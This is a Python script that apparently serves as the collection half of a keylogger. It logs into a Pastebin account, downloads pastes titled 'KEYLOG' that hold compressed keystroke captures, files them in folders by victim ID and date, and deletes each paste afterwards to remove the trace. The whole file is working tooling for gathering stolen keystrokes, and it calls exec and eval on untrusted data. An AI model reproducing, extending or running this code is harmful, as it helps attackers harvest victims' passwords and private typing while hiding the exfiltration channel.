import os
import time
import zlib
import requests
import pyperclip
import webbrowser
import xml.etree.ElementTree as ET

def mkdir(dir):
    if not os.path.exists(dir):
        os.mkdir(dir)

def get_pastes():
    global root
    login_data = {
        'api_dev_key': key,
        'api_user_name': username,
        'api_user_password': password
    }
    data = {
        'api_option': 'list',
        'api_dev_key': key,
        'api_user_key': None,
        'api_results_limit': 50
    }
 
    login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
    data['api_user_key'] = login.text
    r = requests.post("https://pastebin.com/api/api_post.php", data=data)
    root = ET.fromstring("<data>"+r.text+"</data>")

def delete_log(pasteID):
    login_data = {
        'api_dev_key': key,
        'api_user_name': username,
        'api_user_password': password
    }
    data = {
        'api_option': 'delete',
        'api_dev_key': key,
        'api_user_key': None,
        'api_paste_key': pasteID.replace("https://pastebin.com/raw/","")
    }
 
    login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
    data['api_user_key'] = login.text
    r = requests.post("https://pastebin.com/api/api_post.php", data=data)

os.system("cls")
if os.path.exists("creds.sav"):
    exec(open("creds.sav","r").read())
    print("Pastebin credentials loaded!\n")
else:
    input("Error: No Pastebin credentials saved to creds.sav! ")
    exit()

get_pastes()

i = 0
names = []
urls = []
while i < len(root):
    names += [root[i][2].text]
    urls += [root[i][8].text.replace("https://pastebin.com/","https://pastebin.com/raw/")]
    i += 1

i = 0
while i < len(urls):
    print("[Log Downloader]")
    print(f"Parsing paste {i+1}/{len(urls)}")
    a = requests.get(urls[i])
    logFound = True
    if "KEYLOG" in names[i]:
        if a.status_code != requests.codes.ok:
            logFound = False
            pyperclip.copy("")
            webbrowser.open(urls[i])
            print(f"\nLOG NAME: {names[i]}")
            print("We couldn't access the log because the paste is under moderation.")
            print("Copy the raw paste data.")
            while pyperclip.paste() == "":
                time.sleep(0.5)
            paste = zlib.decompress(eval(pyperclip.paste())).decode()

        name = names[i].replace("KEYLOG [ID: ","").replace("DATE: ","").replace("]","").replace("@","-").replace("|","-")
        name = name.split(" - ")

        mkdir("./ids/")
        mkdir("./ids/"+name[0])
        mkdir("./ids/"+name[0]+"/"+name[1].replace("/","-"))
        filestr = "./ids/"+name[0]+"/"+name[1].replace("/","-")+"/"+name[2].replace(":","-")+".log"
        with open(filestr,"w") as log:
            if logFound == True:
                b = zlib.decompress(eval(a.content.decode("utf-8")))
                log.write(b.decode("utf-8"))
                log.close()
            elif logFound == False:
                log.write(paste)
                log.close()
        delete_log(urls[i])
    os.system("cls")
    i += 1
input("Successfully downloaded logs. ")